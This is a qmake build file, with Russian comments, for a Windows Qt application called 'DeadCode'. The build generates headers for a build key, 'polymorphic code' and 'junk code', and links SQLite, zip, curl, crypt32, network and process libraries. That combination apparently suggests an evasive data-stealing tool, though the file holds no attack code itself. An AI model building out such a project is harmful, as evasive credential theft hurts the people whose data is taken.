# Основные модули Qt, которые используются в проекте
QT += core gui network widgets

# Имя целевого исполняемого файла
TARGET = DeadCode
# Тип проекта — приложение
TEMPLATE = app

# Исходные файлы (.cpp)
SOURCES += \
    ../src/main.cpp \
    mainwindow.cpp

# Заголовочные файлы (.h)
HEADERS += \
    mainwindow.h \
    ../src/build_key.h \
    ../src/polymorphic_code.h \
    ../src/junk_code.h

# Файлы интерфейса (.ui)
FORMS += \
    mainwindow.ui

# Ресурсы (иконка)
RC_ICONS = ../icon.ico

# Пути для поиска заголовочных файлов
INCLUDEPATH += \
    ../src \
    . \
    C:/vcpkg/installed/x64-windows-static/include \
    ../release

# Библиотеки (vcpkg и системные Windows-библиотеки)
LIBS += -LC:/vcpkg/installed/x64-windows-static/lib \
        -lsqlite3 \
        -lzip \
        -lz \
        -lbz2 \
        -lcurl \
        -lbcrypt \
        -lws2_32 \
        -lgdiplus \
        -liphlpapi \
        -lpsapi \
        -lshlwapi \
        -lcrypt32 \
        -lgdi32

# Флаги компиляции
QMAKE_CXXFLAGS += -O2 \
                  -std=c++17 \
                  -Wall \
                  -Wextra \
                  -Werror=return-type \
                  -fexceptions \
                  -DUNICODE \
                  -D_UNICODE \
                  -DWIN32 \
                  -DQT_NO_DEBUG \
                  -D_CRT_SECURE_NO_WARNINGS

# Флаги линковки
QMAKE_LFLAGS += -DYNAMICBASE \
                -NXCOMPAT \
                -SUBSYSTEM:WINDOWS

# Определения для сборки (добавляем дату сборки и версию из git)
# Используем дату в формате ISO (кроссплатформенный способ)
BUILD_DATE = $$system(date /T) # Для Windows в GitHub Actions
# Если date /T не работает, можно использовать QMAKE
isEmpty(BUILD_DATE) {
    BUILD_DATE = $$system(echo %DATE%)
}
# Получаем версию из git, с запасным вариантом
BUILD_VERSION = $$system(git rev-parse --short HEAD 2> nul)
isEmpty(BUILD_VERSION) {
    BUILD_VERSION = "unknown"
}
DEFINES += BUILD_DATE=\\\"$${BUILD_DATE}\\\" \
           BUILD_VERSION=\\\"$${BUILD_VERSION}\\\"

# Директории для выходных файлов (относительные пути внутри проекта)
DESTDIR = ../build
OBJECTS_DIR = ../release
MOC_DIR = ../release
UI_DIR = ../release

# Очистка (удаляем исполняемый файл и промежуточные файлы)
QMAKE_CLEAN += \
    ../build/DeadCode.exe \
    ../release/*.o \
    ../release/*.cpp \
    ../release/*.h

# Дополнительные проверки и зависимости для Windows
win32 {
    CONFIG(debug, debug|release) {
        # Для отладочной сборки
        QMAKE_CXXFLAGS += -g
    } else {
        # Для релизной сборки
        QMAKE_CXXFLAGS += -O2
        QMAKE_LFLAGS += -O2
    }
}

# Пользовательские шаги сборки для генерации заголовков
PRE_TARGETDEPS += \
    ../src/build_key.h \
    ../src/polymorphic_code.h \
    ../src/junk_code.h

# Создание пустых файлов, если они отсутствуют (кроссплатформенный способ через Qt)
!exists(../src/build_key.h) {
    system(echo. > ../src/build_key.h)
}
!exists(../src/polymorphic_code.h) {
    system(echo. > ../src/polymorphic_code.h)
}
!exists(../src/junk_code.h) {
    system(echo. > ../src/junk_code.h)
}